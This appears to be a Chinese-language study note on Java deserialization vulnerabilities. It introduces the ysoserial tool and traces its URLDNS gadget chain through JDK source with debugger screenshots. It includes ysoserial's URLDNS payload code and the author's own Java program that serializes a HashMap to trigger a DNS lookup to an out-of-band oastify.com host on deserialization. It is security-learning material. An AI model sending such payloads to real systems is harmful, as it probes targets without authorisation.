# ysoserial

在说反序列化漏洞利⽤链前，我们跳不过⼀个⾥程碑式的工具，ysoserial。

反序列化漏洞在各个语⾔⾥本不是⼀个新鲜的名词，但2015年Gabriel Lawrence (@gebl)和Chris
Frohoff (@frohoff)在AppSecCali上提出了利⽤Apache Commons Collections来构造命令执行的利用
链，并在年底因为对Weblogic、 JBoss、 Jenkins等著名应⽤的利⽤，⼀⽯激起千层浪，彻底打开了⼀片
Java安全的蓝海。

而ysoserial就是两位原作者在此议题中释出的⼀个工具，它可以让用户根据自己选择的利用链，生成反
序列化利用数据，通过将这些数据发送给目标，从而执行用户预先定义的命令。

利⽤链也叫“gadget chains”，我们通常称为gadget。如果你学过PHP反序列化漏洞，那么就可以将
gadget理解为⼀种方法，它连接的是从触发位置开始到执行命令的位置结束，在PHP⾥可能
是 __desctruct 到 eval ；如果你没学过其他语⾔的反序列化漏洞，那么gadget就是⼀种生成POC的
方法罢了。  

# URLDNS

URLDNS就是ysoserial中一个利用链的名字，但准确来说，这个其实不能称作"利用链"。因为其参数不是一个可以"利用"的命令，而仅为一个URL，其能触发的结果也不是命令执行，而是一次DNS请求。

虽然这个"利用链""实际上是不能"利用"的，但因为其如下的优点，非常适合我们在检测反序列化漏洞时使用：

- 使用Java内置的类构造，对第三方库没有依赖
- 在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞

代码如下：

```java
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```

# 利用链分析

看到URLDNS类的getObject方法，ysoserial会调用这个方法获得Payload。这个方法返回的是一个对象，这个对象就是最后将被序列化的对象，在这里是HashMap 。

触发反序列化的方法是readObject，一位内Java开发者经常会在这里面写自己的逻辑，所以导致可以构造利用链。

那么，我们可以直奔HashMap类的readObject方法：

```java
 /**
     * Reconstitutes this map from a stream (that is, deserializes it).
     * @param s the stream
     * @throws ClassNotFoundException if the class of a serialized object
     *         could not be found
     * @throws IOException if an I/O error occurs
     */
    private void readObject(java.io.ObjectInputStream s)
        throws IOException, ClassNotFoundException {
        // Read in the threshold (ignored), loadfactor, and any hidden stuff
        s.defaultReadObject();
        reinitialize();
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new InvalidObjectException("Illegal load factor: " +
                                             loadFactor);
        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0)
            throw new InvalidObjectException("Illegal mappings count: " +
                                             mappings);
        else if (mappings > 0) { // (if zero, use defaults)
            // Size the table using given load factor only if within
            // range of 0.25...4.0
            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

在1413行的位置，可以看到将HashMap的键名计算了hash：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231103152511.png)

为何会关注hash函数？因为ysoserial的注释中很明确地说明了“During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.”，是hashCode的计算操作触发了DNS请求。  

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231103155232.png)

在debug之前先记录一下如何在idea中调试java项目。

1. 下载源码，然后用Intellij IDEA打开。如果这个项目里面包含了pom.xml文件，说明这个是用maven打包的项目，这时候Intelliy IDEA会自动根据其中的配置下载依赖。如果依赖有问题，你可以手工点击菜单里的Files - Project Structure，然后配置Libraries。

2. 依赖弄好了，我们需要干一件事，就是找找整个项目里有哪些入口点（其实就是主类和main函数）。这个其实可以在maven的配置文件里找到，比如ysoserial的主类在这里配置的：

   ![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231103161408.png)

   maven-assembly-plugin就是一个用来打包项目的插件，可以把依赖、类文件什么的都打包在一起。这里的mainClass的值是ysoserial.GeneratePayload，自然就是主类。

3. 根据这个配置，打开文件src/main/java/ysoserial/GeneratePayload.java，点击绿色小箭头debug，因为没加参数所以会打印usage。

4. 修改Program arguments，加上运行时的命令行参数即可

   ![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231103165236.png)

   5. 我在CommonsCollections1这个gadget的代码里下拉个断点，这里已经成功断下，command的值是id

      ![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231103165420.png)



继续跟进hash方法：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231105114907.png)

hash调用了key的hashcode方法

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231105115831.png)

这里的key是URL对象，跟进其hashcode方法：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231105120012.png)

跟进handler的hashcode方法：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231105120652.png)

发现调用getHostAddress方法：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231105120757.png)

getByName根据主机名，获取其IP地址，也就是进行DNS查询：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231105132330.png)

简单验证一下：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231105135839.png)

所以，URLDNS的Gadget如下：

1. HashMap->readObject()
2. HashMap->hash()
3. URL->hachCode()
4. URLStramHandler->hashCode()
5. URLStramHandler->getHostAddress()
6. InetAddress->getByName()

测试：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231106134546.png)

但是发现序列化竟然会触发DNS请求：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231106134946.png)

调试一下，发现到URL的hashCode方法时，若hashCode值不为-1，则返回并且不执行handler的hashCode方法。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231106141821.png)

有两种解决办法。

第一种，是ysoserial里面用的SilentURLStreamHandler类：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231106162255.png)

该类重写了getHostAddress，使其返回null，也就不会发送DNS请求。

第二种，是通过Java的反射机制，修改对象属性。

```java
package test;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class SerializeTest {
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void main(String[] args) throws Exception{
        HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
        URL url = new URL("http://izl1dgp84pd0cn1u61qj47332u8lwhk6.oastify.com");
        Class c = url.getClass();
        Field field = c.getDeclaredField("hashCode");
        field.setAccessible(true);//hashCode是private变量
        field.set(url,1234);//将hashcode置为1234
        hashmap.put(url,1);//此时hashcode为1234所以不触发DNS请求
        field.set(url,-1);//再将其置为-1，使其在反序列化时能正常发起DNS请求
        serialize(hashmap);
    }
}
```

验证：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231106164011.png)



![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231106164035.png)

# 总结

对反序列化还有些底层的细节方面不清楚，希望能在后续的学习中搞明白。

# 参考链接

1. https://www.bilibili.com/video/BV16h411z7o9
2. https://github.com/phith0n/JavaThings
3. https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%AE%9E%E6%88%98-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-URLDNS
4. https://blog.csdn.net/qq_29163073/article/details/122708355
5. https://github.com/frohoff/ysoserial/tree/master